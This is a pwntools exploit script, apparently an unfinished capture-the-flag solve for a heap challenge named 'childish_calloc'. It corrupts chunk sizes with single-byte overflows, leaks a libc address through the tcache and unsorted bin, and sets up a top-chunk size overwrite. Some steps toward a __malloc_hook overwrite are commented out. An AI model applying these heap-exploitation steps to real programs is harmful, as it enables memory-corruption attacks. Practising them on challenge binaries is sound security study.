#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import p64, u64

p = process('./childish_calloc_patched')
binary = ELF('./childish_calloc_patched')
libc = ELF('libc.so.6')
context.arch = 'amd64'

def send(b, a=': '):
    p.sendlineafter(a,str(b))

def sendchoice(choice: int):
    p.sendlineafter("Choice: ", str(choice))

def alloc(index,size,detail):
    sendchoice(1)
    send(index)
    send(size)
    send(detail)

def send2(b, a=': '):
    p.sendafter(a, b)

def alloc2(index,size,detail):
    sendchoice(1)
    send(index)
    send(size)
    send2(detail)

def free(index,size,data):
    global done
    sendchoice(2)
    send(index)
    send(size)
    send2(data)

def free2(index):
    sendchoice(2)
    send(index)
    send(0)

def examine(index):
    sendchoice(3)
    send(index)

def save(size):
    sendchoice(4)
    send(size)

def main():


    # 0x1f is the smallest we can allocate
    # 0x38 is the max we can allocate


    alloc(0, 0x38, 'a')
    alloc(1, 0x38, 'b')
    alloc(2, 0x38, 'c')
    alloc(3, 0x38, 'd')

    # alloc(12, 0x38, 'overwrite')
    # alloc(13, 0x38, 'a')
    # alloc(14, 0x28, 'b')
    # alloc(6, 0x20, 'c') 
    # alloc(10, 0x38, 'e')
    alloc(7, 0x28, 'consolidation')
    # alloc2(9, 0x30, p64(0xf0)*4)
    # free2(9)


    free2(0)
    alloc2(10, 0x38, b'a'* 0x38 + b'\xc1')

    for _ in range(8): free2(1)
    examine(1)
    libc_leak = u64(p.recvline(False).ljust(8, b'\x00'))
    libc.address = libc_leak - 0x3ebca0
    print(hex(libc.address))

    # free2(12)
    # alloc2(4, 0x38, b'A'*0x38 + b'\x71')
    # free2(14)
    # alloc2(5, 0x28, b'A'*0x28 + b'\x71')

    # for _ in range(7): free2(13)

    # free2(13)
    # free2(6)
    # free2(13)

    # free(6, 0x38, p64(libc.sym.__malloc_hook))
    
    # alloc(11, 0x38, 'a')

    alloc(4, 0x38, 'garbage')
    alloc(5, 0x38, 'garbage')
    alloc(6, 0x38, 'garbage')

    # alloc(11, 0x28, 'a')
    alloc2(12, 0x38, p64(0xf1)*(0x38//8))
    alloc(13, 0x38, 'a')
    alloc(14, 0x38, 'a')

    free2(7)
    alloc2(8, 0x28, b'A'*0x28 + b'\xc1')
    free2(12)

    free2(6)
    alloc2(9, 0x38, b'A'*0x38 + b'\x41')

    free(8, 0x38, b'A'*0x28 + p64(0xffffffffffffffff))

    attach(p, """
    heap chunks
    heap bins
    """)
    p.interactive()

if __name__ == '__main__':
    main()